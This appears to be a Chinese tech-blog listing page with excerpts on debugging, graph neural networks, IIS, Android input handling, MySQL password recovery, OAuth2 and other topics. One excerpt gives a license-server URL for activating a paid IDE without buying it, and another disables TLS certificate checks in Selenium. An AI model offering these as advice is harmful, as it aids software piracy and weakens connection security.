		 console.log(xxx); ---控制台带印输出xxx degger --- 进入调试模式 断点与 js代码修改：单步执行(F10快捷键)、单步跳入此执行块(F11快捷键) 在调试中如果发现需要修改的地方，也是可以立即修改的，修改后保存即可生效 快速进入调试的方法： F11进入此程序块，此时将鼠标放在此函数上，会出现相关提示，会告诉你在该文件的哪一行代码处，点击即可直接看到这个函数，然后临时打上断点，按F10或者点击右上角的第二个按钮即可直接进入此函数的断点处 F8: 继续执行
F10: step over, 单步执行, 不进入函数 F11: step into, 单步执行, 进入函数 shift + F11: step out, 跳出函数 ctrl + o: 打开文件 ctrl + shit + o: 跳到函数定义位置 ctrl + shift + f: 所有脚本中搜索 ctrl+p 项目中定位文件 Snippets 随时编写代码，代码是全局保存的，我们在任何页面，包括新建标签页，都可以查看或运行这些代码。 每次格式化JSON数据都要编写这段代码实在太麻烦，我们可以使用chrome控制台的copy接口解决这一问题： 请求项的右键菜单中选择Copy Response拷贝响应内容 命令行中使用copy接口处理数据 得到格式化的JSON数据 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/45c539fecdf372d3df7da6d0a8f178cc/" rel="bookmark">
			浅析图卷积神经网络
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		今天想和大家分享的是图卷积神经网络。随着人工智能发展，很多人都听说过机器学习、深度学习、卷积神经网络这些概念。但图卷积神经网络，却不多人提起。那什么是图卷积神经网络呢？简单的来说就是其研究的对象是图数据（Graph），研究的模型是卷积神经网络。
为什么有图卷积神经网络 自2012年以来，深度学习在计算机视觉以及自然语言处理两个领域取得了巨大的成功。和传统方法相比，它好在哪里呢？
假设有一张图，要做分类，传统方法需要手动提取一些特征，比如纹理啊，颜色啊，或者一些更高级的特征。然后再把这些特征放到像随机森林等分类器，给到一个输出标签，告诉它是哪个类别。而深度学习是输入一张图，经过神经网络，直接输出一个标签。特征提取和分类一步到位，避免了手工提取特征或者人工规则，从原始数据中自动化地去提取特征，是一种端到端（end-to-end）的学习。相较于传统的方法，深度学习能够学习到更高效的特征与模式。
卷积神经网络很好，但是它研究的对象还是限制在Euclidean domains的数据。什么是Euclidean data？ Euclidean data最显著的特征就是有规则的空间结构，比如图片是规则的正方形栅格，比如语音是规则的一维序列。而这些数据结构能够用一维、二维的矩阵表示，卷积神经网络处理起来很高效。
但是，我们的现实生活中有很多数据并不具备规则的空间结构，称为Non Euclidean data。比如推荐系统、电子交易、计算几何、脑信号、分子结构等抽象出的图谱。这些图谱结构每个节点连接都不尽相同，有的节点有三个连接，有的节点有两个连接，是不规则的数据结构。
下面结合两个典型的业务场景来说明什么是图：
社交网络非常适合用图数据来表达
上面的图谱刻画社交网络中各个节点以及它们之间的关系，用户A、用户B、帖子都是节点，用户与用户之间的关系是关注，用户与帖子之间的关系可能是发布或者转发。通过这样一个图谱，可以分析用户对什么人、什么事感兴趣，进一步实现推荐机制。
电商场景中的图谱
在电商中，我们首先可以想到的关键节点就是，用户、交易和商品。用户关联的节点比如会有注册地址、收获地址等；交易会关联到商品、收货地址、交易IP等、商品会关联类目等。这些节点之间的关系，比如用户除了可以通过交易购买商品，还可以对商品进行评分。这样的图数据我们可以用来做两件事情，一是推荐、二是反欺诈。
通过上面两个例子，可以很明显的感受到，图有两个基本的特性：
一是每个节点都有自己的特征信息。比如针对上图，我们建立一个风控规则，要看这个用户的注册地址、IP地址、交易的收货地址是否一样，如果这些特征信息不匹配，那么系统就会判定这个用户就存在一定的欺诈风险。这是对图节点特征信息的应用。
二是图谱中的每个节点还具有结构信息。如果某段时间某个IP节点连接的交易节点非常多，也就是说从某个IP节点延伸出来的边非常多，那么风控系统会判定这个IP地址存在风险。这是对图节点结构信息的应用。
总的来说，在图数据里面，我们要同时考虑到节点的特征信息以及结构信息，如果靠手工规则来提取，必将失去很多隐蔽和复杂的模式，那么有没有一种方法能自动化地同时学到图的特征信息与结构信息呢？——图卷积神经网络
什么是图卷积神经网络 图卷积神经网络（Graph Convolutional Network）是一种能对图数据进行深度学习的方法。
图卷积算子：
上面给出的是图卷积算子的计算公式，设中心节点为i；
如何理解图卷积算法？我们看动图分三步去理解（注意不同颜色代表不同的权重）：
第一步：发射（send）每一个节点将自身的特征信息经过变换后发送给邻居节点。这一步是在对节点的特征信息进行抽取变换。
第二步：接收（receive）每个节点将邻居节点的特征信息聚集起来。这一步是在对节点的局部结构信息进行融合。
第三步：变换（transform）把前面的信息聚集之后做非线性变换，增加模型的表达能力。
图卷积神经网络具有卷积神经网络的以下性质：
1、局部参数共享，算子是适用于每个节点（圆圈代表算子），处处共享。
2、感受域正比于层数，最开始的时候，每个节点包含了直接邻居的信息，再计算第二层时就能把邻居的邻居的信息包含进来，这样参与运算的信息就更多更充分。层数越多，感受域就更广，参与运算的信息就更多。
我们来看GCN这个模型框架，输入是一张图，经过一层一层计算变换，最后输出一张图。
GCN模型同样具备深度学习的三种性质：
1、层级结构（特征一层一层抽取，一层比一层更抽象，更高级）；
2、非线性变换 （增加模型的表达能力）；
3、端对端训练（不需要再去定义任何规则，只需要给图的节点一个标记，让模型自己学习，融合特征信息和结构信息。）
GCN四个特征：
1、GCN 是对卷积神经网络在 graph domain 上的自然推广。
2、它能同时对节点特征信息与结构信息进行端对端学习，是目前对图数据学习任务的最佳选择。
3、图卷积适用性极广，适用于任意拓扑结构的节点与图。
4、在节点分类与边预测等任务上，在公开数据集上效果要远远优于其他方法。
我们怎么用图卷积神经网络 下面分享一个我们在实际应用场景中的实验：
实验输入是一个验证数据构成的图数据，节点是验证事件以及事件相关的属性节点。如IP，DeviceID，UA等节点。（我们总计用了30天的验证数据，每两个小时的数据构成一张图，共360张图。）
实验输出是对事件节点进行人机分类，正常或者异常。
实验细节
网络结构：
GCN(128)-&gt;GCN(64)-&gt;GCN(64)-&gt;Linear(2)
训练: Adam优化器, lr=0.001
参照基准: 以只能学习特征信息的GBDT做为基准, grid_search 搜索超参数，GBDT是目前最流行的浅层分类器。
我们用第一天的数据做训练，持续30天预测结果如下：
GCN模型的准确率衰减比较小，而GBDT的衰减很严重。可见，GCN模型的人机判别效果要好，鲁棒性好。
7d评估效果可视化，（用第一天的数据训练模型，第七天观察其预测效果及最后一层输出的tsne可视化结果)。上图可以看出，GCN在第七天时对样本判别的分界面仍很明显，但是GBDT对样本判别的分界面已经很模糊类了。综上，GCN学到的结构信息在人机判别中不仅效果很好，也具有更好的鲁棒性。
写在最后 由于时间有限，很多问题浅尝辄止，关于GCN还有很多有趣的东西。我们将开设专栏《Graph Learning》，作者会分享给大家更加全面的图学习算法。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/45c539fecdf372d3df7da6d0a8f178cc/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/9dcc9bb542c0068f83a7426325e33385/" rel="bookmark">
			python操作c&#39;s&#39;v及xls(excel)文件
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1. 操作csv，使用python的csv模块 操作如下数据表csv格式 # -*- coding: utf-8 -*- """ Created on Sun May 20 13:04:27 2018 @author: spfhy """ import csv class OpTestConfig: def __init__(self,ops,case_name,param,run_mode,run_type): self.ops = ops self.case_name = case_name self.param = param self.run_mode = run_mode self.run_type = run_type def opTestGenerateCmd(self): cmd = self.ops + ' ' + self.case_name + ' '\ + self.run_mode + ' ' + self.param + ' ' + self.run_type return cmd #解析config配置文件 binFilePath = '' run_mode = 'IPU' run_type = '3' with open("
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/9dcc9bb542c0068f83a7426325e33385/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/90a0e037e3c99d71d220aa7aeb01732e/" rel="bookmark">
			【C#】最完整的IIS添加WCF配置
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Windows的网站服务器IIS，默认是没有WCF运行环境的，所以需要自己添加配置。之后，才能作为一个网站后台服务，提供接口以供外部调用。下面就其完整步骤进行说明：
第一步：检查Windows7中IIS是否安装了必要的组件
方法：控制面板-&gt;程序和功能-&gt;打开或关闭Windows功能，以下图片中标注的功能Windows7默认不会安装的
第二步：检查IIS的配置
系统必备功能安装完成后打开IIS服务管理器，点默认网站，双击“处理程序映射”如下
检查图中红色标注部分是否已经存在，否则WCF服务是无法调用的。不幸如果没有找到这几项的话，则需要安装注册WCF组件
第三步：安装注册WCF组件流程
1、使用administrator管理员身份运行cmd命令行工具。（开始 ==&gt; 附件==&gt; 命令提示符 ==&gt; 右键以管理员身份运行）
2、进入WCF文件夹：cd C:\WINDOWS\Microsoft.NET\Framework\v3.0\Windows Communication Foundation
3、注册WCF组件，执行：ServiceModelReg.exe -i 回车，如下图：
第四步：IIS注册4.0框架
如果想运行4.0的网站，需要用aspnet_regiis注册4.0框架，然后用4.0的Class池，就可以运行4.0的web项目。操作流程跟上一步类似，以管理员身份运行DOS窗口，然后进入C:\Windows\Microsoft.NET\Framework\v4.0.30319，最后执行aspnet_regiis.exe -i ，如下图：
此时，IIS就可以运行 .net 4.0部署的网站了，但对于WCF，兴许还需要进行接下来的步骤。
第五步：MIME类型修改
在界面中找到MIME类型，双击打开，这里选中任意的网站都可以，因为MIME类型针对于全部网站
点击右上角的“添加”，填写内容如下即可：
第六步：“处理程序映射”修改
双击打开“处理程序映射”：
点击右上角的“添加托管处理程序”，添加信息如下即可：
至此，所有的WCF相关环境设置完成，可以运行WCF后台服务程序了。如果这里还是有问题，那可能是电脑兼容性的问题，可以尝试开启32位兼容模式，具体在右上角的“编辑权限”中。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/b292d30ecce145871a40320ee1ac6e4e/" rel="bookmark">
			Android事件传递流程
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		##启动服务
在系统启动时候，会启动多个服务，其中包括InputManagerService
inputManager = new InputManagerService(context); 看看InputManagerService构造方法
public InputManagerService(Context context) { this.mContext = context; this.mHandler = new InputManagerHandler(DisplayThread.get().getLooper()); .... mPtr = nativeInit(this, mContext, mHandler.getLooper().getQueue()); //mPtr是NativeInputManager的实例 .... } 构造方法中比较重要的是nativeInit，对应在com_android_server_input_InputManagerService.cpp中执行
static jlong nativeInit(JNIEnv* env, jclass /* clazz */, jobject serviceObj, jobject contextObj, jobject messageQueueObj) { sp&lt;MessageQueue&gt; messageQueue = android_os_MessageQueue_getMessageQueue(env, messageQueueObj); if (messageQueue == NULL) { jniThrowRuntimeException(env, "MessageQueue is not initialized."); return 0; } NativeInputManager* im = new NativeInputManager(contextObj, serviceObj, messageQueue-&gt;getLooper()); im-&gt;incStrong(0); return reinterpret_cast&lt;jlong&gt;(im); } 上述主要完成NativeInputManager初始化，并返回NativeInputManager实例对象，继续分析NativeInputManager构造函数，同样在com_android_server_input_InputManagerService.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/b292d30ecce145871a40320ee1ac6e4e/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/f35cd68c1ba6dc55bd61146b20bae1b2/" rel="bookmark">
			GoLang激活码
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		虽然行为不太好，但是购买的话实在是比较贵。
进入软件，Help-Register，选择License Server，输入
http://idea.youbbs.org 激活即可。
转载于:https://www.cnblogs.com/GoForMyDream/p/9059645.html
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/d290e00ee3dc75bbf69aa35c6e3d21cb/" rel="bookmark">
			车道线检测之lanelines-detection
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		本篇博客整个项目源码：github NOTE：本文只介绍了基本的车道线检测方法，预测曲率及车辆位置的车道线检测请戳：无人驾驶之高级车道线检测-AdvanceLanefinding_release
前言 本次博客主要分享Udacity自动驾驶纳米学位的第一个项目，车道线检测算法模型的实现。 本项目主要实现以下几个功能：
在一张图片上检测出车道线，并将其标记成红色在一段视频上检测出车道线，并将其标记为红色 基本实现思路 我们采用传统的边缘检测的方法，如canny算法检测出轮廓，然后利用Hough变换检测出直线，最后在图片或者视频上画出直线。模型架构图如下所示： 这模型实现期间我们使用了一些小技巧：
去噪角度滤波器：滤除极小锐角或极大钝角的线段选取黄色的色调，并用白色代替在边缘检测前，放大一些特征 具体代码实现 # importing some useful packages import matplotlib.pyplot as plt import matplotlib.image as mpimg import numpy as np import cv2 %matplotlib inline #reading in an image dir_img = 'test_images/' image = mpimg.imread('test_images/solidWhiteRight.jpg')#RGB #print out some stats and plotting print('This image is:',type(image),'with dimensions:',image.shape) plt.imshow(image) This image is: &lt;class 'numpy.ndarray'&gt; with dimensions: (540, 960, 3) &lt;matplotlib.image.AxesImage at 0x7f6064cb4860&gt; 车道线检测的一些思路 opencv库为我们提供了一些有用的函数： cv2.inRange():颜色选择 cv2.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/d290e00ee3dc75bbf69aa35c6e3d21cb/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/118989180bf827dba402960c5464d2a8/" rel="bookmark">
			微信小程序 mpvue，webview中h5页面向小程序发送数据bindmessage方法
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		公司小程序场景中需要用到webview中的bindmessage方法，因为不好好看文档，弄了好长时间，心碎，所以在这里给自己加深一下印象，要好好看文档。 方法的话，微信小程序原生写法和mpvue方法类似，在这里仅以mpvue为例，以转发为条件触发bindmessage事件
注意点 网页向小程序 postMessage 时，会在特定时机（小程序后退、组件销毁、分享）触发并收到消息。一定看清楚是小程序后退、组件销毁、分享时才会触发，我没看清弄了好长时间，蓝瘦香菇…… 感觉这个方法有点坑，请慎用……，特定时机（小程序后退、组件销毁、分享）触发 小程序 template &lt;web-view :src="url" @message="bindmessage"&gt;&lt;/web-view&gt; script bindmessage(e){ console.log(e) } h5页面 html 引入js sdk &lt;!-- html --&gt; &lt;script type="text/javascript" src="https://res.wx.qq.com/open/js/jweixin-1.3.2.js"&gt;&lt;/script&gt; script 向小程序传值的方法 // javascript wx.miniProgram.postMessage({ data: 'foo' }) wx.miniProgram.postMessage({ data: {foo: 'bar'} }) 所有代码 以转发为条件触发bindmessage事件 &lt;template&gt; &lt;div&gt; &lt;web-view :src="url" @message="bindmessage"&gt;&lt;/web-view&gt; &lt;/div&gt; &lt;/template&gt; &lt;script&gt; import store from '@/pages/counter/store' export default { data () { return { url:'' } }, store, onShareAppMessage(options) { return { title: 'title', path: this.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/118989180bf827dba402960c5464d2a8/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/a57b8e54905f331fffad7717c08ac6f9/" rel="bookmark">
			ERROR 1045 (28000): Access denied for user &#39;root&#39;@&#39;localhost&#39; (using password: NO) 的解决办法
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		这个问题是在Windows下安装MySQL服务时遇到的，使用MySQl绿色版进行安装的，安装完成后，连接到MySQL服务时输入命令 “ mysql -uroot -p ” ，因为时第一次登录，未设置密码，直接回车，就遇到了这个问题，错误信息如下：
“ ERROR 1045 (28000): Access denied for user 'root'@'localhost' (using password: NO) ”
如下图：
解决办法：
首先需要关闭MySQL服务，输入命令：
mysql&gt; net stop MySQL
用安全模式开始本地MySQL服务，（注意：以管理员身份启动cmd窗口），输入命令 “ mysqld --defaults-file="G:\Install_Applications\mysql-8.0.11\my.ini" --console --skip-grant-tables ” 启动MySQL服务后，光标会一直停止没有任何输出，这儿的话说明MySQL服务已经启动了。
启动cmd窗口，输入命令 “ mysql -uroot -p ” 直接回车登录到MySQL服务器，然后进行修改，可以输入命令：
(5.7.11以前) &gt; update user set password=password("123456") where user="root";
（5.7.11 或者以后）&gt; update user set authentication_string=password("123456") where user="root";
在这儿我是用的是：
mysql&gt; ALTER USER 'root'@'localhost' IDENTIFIED BY 'HuaZai12345!';
如下图：
现在退出，在输入命令 “ mysql -uroot -p ” 在输入刚才设置的密码，就可以正常登录到MySQL服务器了，如下图：
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/a57b8e54905f331fffad7717c08ac6f9/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/ecb46f1f8f91d8b9d80d97bf23854c81/" rel="bookmark">
			js 简单的时间戳与日期的相互转换（直接拿走用）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		// 一天后的时间转换 var date = new Date( '2018-02-16'); var last = 24 * 60 * 60 * 1000; var time1 = date. getTime(); var news = time1 + last; console. log( time1); // 1518739200000 function timestampToTime( timestamp) { var date = new Date( timestamp); //时间戳为10位需*1000，时间戳为13位的话不需乘1000 Y = date. getFullYear() + '-'; M = ( date. getMonth()+ 1 &lt; 10 ? '0'+( date. getMonth()+ 1) : date. getMonth()+ 1) + '-'; D = date.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/ecb46f1f8f91d8b9d80d97bf23854c81/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/e1218404e7358c391013e1f2b3d07152/" rel="bookmark">
			linux文件操作（ATT汇编）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		首先介绍一下linux的shell脚本写法，其实与windows下.bat文件的写法差不多，一行一行的写命令就行了，例如，当我们要用vim打开某个目录（/user/include/printf.h）下的文件，可以这样写：
cd /usr/include
vim printf.h
保存为run.sh
第一次运行shell脚本时，要先给这个脚本权限，假设脚本名称为“run.sh”，命令为“chmod 777 ./run.sh”，之后就能一直使用了。
进入正文，linux下AT&amp;T汇编——文件操作。
事实上汇编文件操作甚至要比某些高级语言更简单，因为不用去记那么一堆打开参数，在汇编中，由于基本是对于底层的操作，所以不会区分以文本方式打开还是以二进制方式打开，诸如此类。
基本步骤：打开文件（获取文件的标识符）--&gt;操作文件（读取文件或者写入文件）--&gt;关闭文件
以32位linux为例（64位下系统调用号是不同的）：
打开文件的调用号为5，将5存入eax，ebx存入文件路径字符串的首地址，ecx存入打开方式，只读为“0”，写为“03101”，edx存入权限集合，现在存入“0666”就行了，反正我不懂unix的权限。打开成功后，系统会返回该文件的“文件标识符”,在eax里面。之后全程都要用这个文件标识符指代打开的那个文件。
读取文件的调用号为3，存入eax，文件标识符存入ebx，在此之前，要划一个缓存区，用来储存读取的数据，将该缓存区的首地址存入ecx，长度存入edx。读取成功后，会按照edx中的长度填充缓存区，就是edx的值是多少，就填充多少（当然，由文件的长度而定），返回已经读取的长度。
写入文件的调用号为4，存入eax，其余参数同上。返回写入的字节数或者错误代码（写入失败），存入eax。
关闭文件的调用号为6，存入eax，文件描述符存入ebx。只有这两个参数。
下面有一个例子，可以读取一个文件制定数量的字符串，并将里面的小写字符转换为大写字符，存入另一个文件的。代码在最后。设读取的文件名为“data”，写入的文件为“data1”，data的文件内容如下：
hello,world
abcdefg
hijklmn
opqrst
uvwxyz
编写的shell脚本内容如下：
echo "编译代码：" make echo "执行程序：" ./f echo "返回值：" $? makefile文件内容如下（makefile文件是用来编译代码的）：
f:f_open.o ld -m elf_i386 f_open.o -o f f_open.o:f_open.s as --32 f_open.s -o f_open.o 注：因为我的系统是centos7_64位，as和ld程序是默认以64位进行处理的，所以“--32”可以告诉as程序以32位进行编译，“-m elf_i386”告诉ld程序链接32位的库。
结果如下：
具体的汇编代码如下，120多行：
.section .data fin_src: .string "data" fout_src: .string "data1" //定义常量 .equ SYQUIT,1 .equ FILE_OPEN,5 .equ FILE_CLOSE,6 .equ FILE_READ,3 .equ FILE_WRITE,4 .
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/e1218404e7358c391013e1f2b3d07152/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/361452b399cd1c5a9de83e72a4bada1f/" rel="bookmark">
			centos7最小化版无法解析域名
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1.NET网络配置子网IP地址与虚拟机网卡IP在一个地址段
2.网卡网关设置也是在一个地址段下
3.在网卡的配置文件中加入
DNS1=8.8.8.8 #设置主DNS DNS2=8.8.4.4 #设置备DNS 4.重启网络
systemctl restart network
5.测试
ping www.baidu.com 成功
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/8196c9f85447cb247aa49d4f600d73b0/" rel="bookmark">
			C&#43;&#43;内存池(附源码)
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		C++内存池(附源码) 前段时间阅读了Nginx的源码，其对内存高效的管理给我留下了深刻的印象，而内存管理的核心便是内存池。于是想自己实现一个C++版本的内存池，这方面当然还是STL的内存池最为经典，所以免不了参悟借鉴。内存池的概念早已经是老生常谈，然而把内存池实现的高效安全仍是个比较艰巨的问题。内存池的原理简单来讲就是一次性的向系统申请大量的内存，之后再有内存请求的时候，如果内存池的内存大小能够满足请求，就从内存池里分配，不必再进行系统调用，从而实现性能提升，而多次的内存申请系统调用，很容易生成内存碎片而造成内存浪费。池的概念大体如此，线程池，进程池无出其右。内存池的实现主要解决的问题有：
1. 内存池的块管理
2. 内存的分配和回收
3. 大块内存的分配和回收
4. 对象初始化
内存池的块管理 这方面可以直接参考STL的分配器的实现，SGI STL在进行内存分配时，默认使用了一个内存池。这个内存池的内存块从8Byte开始，每递增8Byte都生成一系列链表管理的内存块，一直到128Byte结束。内存块定义为：
union MemNode { MemNode*	_next; char	_data[1]; }; union每个成员的起始地址都是开头的位置，所以每次仅能使用一个成员，在链表中由_next指向下个内存块的地址，在分配内存时由_data指向内存首地址，长度为1 的数组放在结构体最后一个成员位置，可以访问给结构体多分配的地址空间，这种技术叫做柔性数组。这样做的好处减少了对内存块管理时额外的内存损耗。想想我们学习数据结构时实现的链表，都是通过结构体的一个成员来指向下个节点的地址，多出了一个指针4Byte的内存消耗。参考STL，我们内存块的管理如下图所示：
有同学要问了，那我要是申请比128更大的内存怎么办？SGI 这里就直接走正常的内存申请，还是会有系统调用产生。因为系统对于程序请求的内存，管理时也会生成额外的内存控制数据占用内存，这样申请的内存越小，额外占用的内存比例就越高。 我们每次申请指定量的内存，然后将内存格式化到块管理的数组链表中。
char* res; size_t need_bytes = size * nums; size_t left_bytes = _pool_end - _pool_start; //内存池够用 if (left_bytes &gt;= need_bytes) { res = _pool_start; _pool_start += need_bytes; return res; } else if (left_bytes &gt;= size) { nums = left_bytes / size; need_bytes = size * nums; res = _pool_start; _pool_start += need_bytes; return res; } size_t bytes_to_get = size * nums; if (!
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/8196c9f85447cb247aa49d4f600d73b0/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/e8cb7a71160a7b06867327864c335aa7/" rel="bookmark">
			python爬虫访问https网站报错解决方案ERROR:ssl_client_socket_impl.cc(1098)] handshake failed
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 报错信息：
[3488:1356:0512/211222.342:ERROR:ssl_client_socket_impl.cc(1098)] handshake failed; returned -1, SSL error code 1, net_error -101
Chrome浏览器解决方案：
from selenium import webdriver if __name__ == '__main__': options=webdriver.ChromeOptions() options.add_argument('--ignore-certificate-errors') driver=webdriver.Chrome(chrome_options=options) driver.get(u'https://python.org/') driver.close() 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/8b5b76902a1dc4199d164ffef30f2ee9/" rel="bookmark">
			Android耳机拔插事件流程
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Android所有的input设备都会在/dev/input目录下生成对应的设备节点，一旦有任何输入事件产生，便会将事件写到这些节点下，同时对于外部输入设备（鼠标键盘等）的插拔还会引起这些节点的创建和删除 使用adb 命令可以查看当前手机插入的耳机状态,命令为:adb shell cat /sys/class/switch/h2w/state
驱动层input事件传递 耳机拔插属于switch类型的按键消息，对于驱动层面，会先到InputDispatcher.cpp中处理
void InputDispatcher::notifySwitch(const NotifySwitchArgs* args) { #if DEBUG_INBOUND_EVENT_DETAILS ALOGD("notifySwitch - eventTime=%lld, policyFlags=0x%x, switchValues=0x%08x, switchMask=0x%08x", args-&gt;eventTime, args-&gt;policyFlags, args-&gt;switchValues, args-&gt;switchMask); #endif uint32_t policyFlags = args-&gt;policyFlags; policyFlags |= POLICY_FLAG_TRUSTED; mPolicy-&gt;notifySwitch(args-&gt;eventTime, args-&gt;switchValues, args-&gt;switchMask, policyFlags); } 上述mPolicy就是NativeInputManager，在com_android_server_input_InputManagerService.cpp中定义的NativeInputManager
class NativeInputManager : public virtual RefBase, public virtual InputReaderPolicyInterface, public virtual InputDispatcherPolicyInterface, public virtual PointerControllerPolicyInterface { .... .... /* --- InputDispatcherPolicyInterface implementation --- */ virtual void notifySwitch(nsecs_t when, uint32_t switchValues, uint32_t switchMask, uint32_t policyFlags); virtual void notifyConfigurationChanged(nsecs_t when); virtual void interceptKeyBeforeQueueing(const KeyEvent* keyEvent, uint32_t&amp; policyFlags); } 所以上述的调用，会在 com_android_server_input_InputManagerService.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/8b5b76902a1dc4199d164ffef30f2ee9/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/b50b1073bb0c2448d9632a41b9fdafcb/" rel="bookmark">
			Spring Security Oauth2 认证（获取token/刷新token）流程（password模式）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1.本文介绍的认证流程范围 本文主要对从用户发起获取token的请求（/oauth/token），到请求结束返回token中间经过的几个关键点进行说明。
2.认证会用到的相关请求 注：所有请求均为post请求。
获取access_token请求（/oauth/token） 请求所需参数：client_id、client_secret、grant_type、username、password http://localhost/oauth/token?client_id=demoClientId&amp;client_secret=demoClientSecret&amp;grant_type=password&amp;username=demoUser&amp;password=50575tyL86xp29O380t1 检查头肯是否有效请求（/oauth/check_token） 请求所需参数：token http://localhost/oauth/check_token?token=f57ce129-2d4d-4bd7-1111-f31ccc69d4d1 刷新token请求（/oauth/token） 请求所需参数：grant_type、refresh_token、client_id、client_secret 其中grant_type为固定值：grant_type=refresh_token http://localhost/oauth/token?grant_type=refresh_token&amp;refresh_token=fbde81ee-f419-42b1-1234-9191f1f95be9&amp;client_id=demoClientId&amp;client_secret=demoClientSecret 2.认证核心流程 注：文中介绍的认证服务器端token存储在Reids，用户信息存储使用数据库，文中会包含相关的部分代码。
2.1.获取token的主要流程： 加粗内容为每一步的重点，不想细看的可以只看加粗内容：
用户发起获取token的请求。过滤器会验证path是否是认证的请求/oauth/token，如果为false，则直接返回没有后续操作。过滤器通过clientId查询生成一个Authentication对象。然后会通过username和生成的Authentication对象生成一个UserDetails对象，并检查用户是否存在。以上全部通过会进入地址/oauth/token，即TokenEndpoint的postAccessToken方法中。postAccessToken方法中会验证Scope，然后验证是否是refreshToken请求等。之后调用AbstractTokenGranter中的grant方法。grant方法中调用AbstractUserDetailsAuthenticationProvider的authenticate方法，通过username和Authentication对象来检索用户是否存在。然后通过DefaultTokenServices类从tokenStore中获取OAuth2AccessToken对象。然后将OAuth2AccessToken对象包装进响应流返回。 2.2.刷新token（refresh token）的流程 刷新token（refresh token）的流程与获取token的流程只有⑨有所区别：
获取token调用的是AbstractTokenGranter中的getAccessToken方法，然后调用tokenStore中的getAccessToken方法获取token。刷新token调用的是RefreshTokenGranter中的getAccessToken方法，然后使用tokenStore中的refreshAccessToken方法获取token。 2.3.tokenStore的特点 tokenStore通常情况为自定义实现，一般放置在缓存或者数据库中。此处可以利用自定义tokenStore来实现多种需求，如：
同已用户每次获取token，获取到的都是同一个token，只有token失效后才会获取新token。同一用户每次获取token都生成一个完成周期的token并且保证每次生成的token都能够使用（多点登录）。同一用户每次获取token都保证只有最后一个token能够使用，之前的token都设为无效（单点token）。 3.获取token的详细流程（代码截图） 3.1.代码截图梳理流程 1.一个比较重要的过滤器 2.此处是①中的attemptAuthentication方法 3.此处是②中调用的authenticate方法 4.此处是③中调用的AbstractUserDetailsAuthenticationProvider类的authenticate方法 5.此处是④中调用的DaoAuthenticationProvider类的retrieveUser方法 6.此处为⑤中调用的ClientDetailsUserDetailsService类的loadUserByUsername方法，执行完后接着返回执行④之后的方法 7.此处为④中调用的DaoAuthenticationProvider类的additionalAuthenticationChecks方法，此处执行完则主要过滤器执行完毕，后续会进入/oauth/token映射的方法。 8.此处进入/oauth/token映射的TokenEndpoint类的postAccessToken方法 9.此处为⑧中调用的AbstractTokenGranter类的grant方法 10.此处为⑨中调用的ResourceOwnerPasswordTokenGranter类中的getOAuth2Authentication方法 11.此处为⑩中调用的自定义的CustomUserAuthenticationProvider类中的authenticate方法，此处校验用户密码是否正确，此处执行完则返回⑨执行后续方法。 12.此处为⑨中调用的DefaultTokenServices中的createAccessToken方法 13.此处为12中调用的RedisTokenStore中的getAccessToken方法等，此处执行完，则一直向上返回到⑧中执行后续方法。 